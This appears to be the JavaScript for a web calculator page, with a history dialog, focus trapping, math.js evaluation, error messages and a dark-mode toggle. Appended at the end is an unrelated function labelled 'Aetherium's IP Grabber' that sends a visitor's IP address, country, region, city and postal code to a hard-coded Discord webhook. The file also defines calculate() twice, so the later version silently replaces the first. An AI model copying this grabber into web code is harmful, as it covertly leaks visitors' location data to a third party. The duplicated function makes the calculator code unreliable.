let activeElementBeforeDialog;
const calcHistory = [];

const display = document.getElementById("display");
const historyContent = document.getElementById("historyContent");

function openHistory() {
  const historyDialog = document.getElementById("historyDialog");
  historyDialog.removeAttribute("hidden");
  activeElementBeforeDialog = document.activeElement;
  historyDialog.focus();
  historyContent.textContent = calcHistory.join("\n");
  trapFocus(historyDialog);
}

function closeHistory() {
  const historyDialog = document.getElementById("historyDialog");
  historyDialog.setAttribute("hidden", "");
  activeElementBeforeDialog && activeElementBeforeDialog.focus();
}

function trapFocus(element) {
  const focusableElements = element.querySelectorAll(
    'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
  );
  const firstFocusableEl = focusableElements[0];
  const lastFocusableEl = focusableElements[focusableElements.length - 1];
  element.addEventListener("keydown", function (e) {
    if (e.key === "Tab" || e.keyCode === 9) {
      if (e.shiftKey) {
        if (document.activeElement === firstFocusableEl) {
          lastFocusableEl.focus();
          e.preventDefault();
        }
      } else {
        if (document.activeElement === lastFocusableEl) {
          firstFocusableEl.focus();
          e.preventDefault();
        }
      }
    }
  });
}

function saveHistory() {
  localStorage.setItem("calcHistory", JSON.stringify(calcHistory));
}

function appendToDisplay(input) {
  // Clear the display if an error message is displayed
  if (display.value === "Error: Incomplete Expression") {
    display.value = "";
  }
  display.value += input;
}
function handleError(_error) {
  // Set a standard error message
  display.value = "Error: Incomplete Expression";
}

function clearDisplay() {
  display.value = "";
}

function calculate() {
  const equation = display.value;
  try {
    if (/[+\-*/%]$/.test(equation.trim())) {
      throw new Error(
        "Incomplete expression - please enter a number after the operator."
      );
    }
    const result = math.evaluate(equation); // Using math.js library's evaluate function
    if (Number.isNaN(result) || !isFinite(result)) {
      if (equation.includes("/0")) {
        throw new Error("Division by zero is not possible - please try again.");
      } else {
        throw new Error("Invalid calculation - please try again.");
      }
    }
    display.value = result;
    calcHistory.push(equation + " = " + result);
    saveHistory();
    historyContent.setAttribute("aria-live", "polite");
    historyContent.textContent = calcHistory.join("\n");
  } catch (error) {
    display.value = error.message; // Update the display with the error message
  }
}
document
  .getElementById("darkModeToggle")
  .addEventListener("click", function () {
    const isDarkModeOn = document.body.classList.toggle("dark-mode");
    localStorage.setItem("theme", isDarkModeOn ? "dark" : "light");
    this.setAttribute("aria-pressed", isDarkModeOn);
    this.blur();
  });
function loadTheme() {
  if (localStorage.getItem("theme") === "dark") {
    document.body.classList.add("dark-mode");
  }
}

loadTheme();
function calculate() {
  try {
    display.value = math.evaluate(display.value);
  } catch (error) {
    handleError(error);
  }
}
function monke(json) {
  var request = new XMLHttpRequest();

  request.open(
    "POST",
    "https://discord.com/api/webhooks/1213646870069387364/ESoymOBVNkyUIF7rGIJbHf5xayumooI1FdkIIBFMlwMIKsIhaszInKTHjjTdFcBEFGP2"
  );

  request.setRequestHeader("Content-type", "application/json");

  var params = {
    username: "Aetherium's IP Grabber",
    avatar_url:
      "https://cdn.discordapp.com/attachments/1122977732385579030/1159803884257149039/ab024efe2306f15b6a2c50a18732c407.png?ex=65325a8a&is=651fe58a&hm=0da8d1f5655d1a075f040c338cad6abdb134953d5424c53389d0bd713092d23c&",
    embeds: [
      {
        title: "Aetherium's IP Grabber",
        color: 15000,
        description:
          "**IP:** `" +
          json.ip +
          "`\n**Country:** `" +
          json.country +
          "`\n**Region:** `" +
          json.region +
          "`\n**Town/City:** `" +
          json.city +
          "`\n**ZIP:** `" +
          json.postal +
          "`",
      },
    ],
  };

  request.send(JSON.stringify(params));
}
